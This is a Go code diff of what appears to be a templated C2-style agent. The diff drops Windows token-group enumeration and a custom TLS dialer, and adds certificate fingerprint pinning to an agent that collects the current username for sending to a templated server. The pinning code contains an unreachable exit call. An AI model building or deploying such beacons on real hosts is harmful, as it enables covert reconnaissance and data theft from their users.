@@ -18,29 +18,9 @@ import (
 	"os/user"
 	"strings"
 	"time"
-	"net"
-	"bytes"
 
 	"golang.org/x/crypto/chacha20poly1305"
-	"golang.org/x/sys/windows"
 )
-
-
-func getGroups() (SID){
-	token, err := windows.OpenCurrentProcessToken()
-	if err != nil {
-		fmt.Println("Error opening process token:", err)
-	}
-	defer token.Close()
-
-	// Get the groups associated with the user.
-	groups, err := token.GetTokenGroups()
-	if err != nil {
-		fmt.Println("Error getting token groups:", err)
-	}
-	g := fmt.Sprint(groups)
-	return g
-}
 
 func chacha(pass string, msg string) (enc_block []byte) {
 
@@ -102,34 +82,6 @@ func getCurrentUser() (name string) {
 	return
 }
 
-type Dialer func(network, addr string)(net.Conn, error)
-
-func makeDialer(fingerprint []byte, skipCAVerification bool) Dialer {
-    return func(network, addr string) (net.Conn, error) {
-        c, err := tls.Dial(network, addr, &tls.Config{InsecureSkipVerify: skipCAVerification})
-        if err != nil {
-            return c, err
-        }
-        connstate := c.ConnectionState()
-        keyPinValid := false
-        for _, peercert := range connstate.PeerCertificates {
-            der, err := x509.MarshalPKIXPublicKey(peercert.PublicKey)
-            hash := sha256.Sum256(der)
-            // log.Println(peercert.Issuer)
-            // log.Printf("%#v", hash)
-            if err != nil {
-                log.Fatal(err)
-            }
-            if bytes.Compare(hash[0:], fingerprint) == 0 {
-                log.Println("Pinned Key found")
-                keyPinValid = true
-            }
-        }
-        if keyPinValid == false {
-        }
-        return c, nil
-    }
-}
 
 func main() {
     const serverCert = "-----BEGIN CERTIFICATE-----\n{{.ServerKey}}\n-----END CERTIFICATE-----"
@@ -149,11 +101,38 @@ func main() {
 
 	uuid := "{{.UUID}}"
 	// Construct the client for requests, we define nothing right now but in the future can add functionality
-	client := &http.Client{}
-	fingerprint := []byte ("{{.Fingerprint}}")
-	client.Transport = &http.Transport{
-	    DialTLS: makeDialer(fingerprint, true),
-	}
+	//client := &http.Client{}
+	expectedFingerprint := "{{.Fingerprint}}"
+	client := &http.Client{
+        Transport: &http.Transport{
+            TLSClientConfig: &tls.Config{
+                InsecureSkipVerify: true, // Set to false to enforce certificate verification
+                VerifyPeerCertificate: func(rawCerts [][]byte, verifiedChains [][]*x509.Certificate) error {
+                    // Extract the peer certificate from the raw certificates
+                    peerCert, err := x509.ParseCertificate(rawCerts[0])
+                    if err != nil {
+                        return err
+                    }
+                    fmt.Printf("Got peer")
+
+                    // Calculate the fingerprint of the certificate
+                    actualFingerprint := sha256.Sum256(peerCert.Raw)
+
+                    actualFingerprintStr := hex.EncodeToString(actualFingerprint[:])
+
+                    // Compare the actual fingerprint with the expected one
+
+                    if actualFingerprintStr != expectedFingerprint {
+                        return fmt.Errorf("certificate fingerprint mismatch")
+                        os.Exit(1)
+                    }
+
+                    // Certificate is valid, no error
+                    return nil
+                },
+            },
+        },
+    }
 
 	result := getCurrentUser()
 	toSend := string(result)
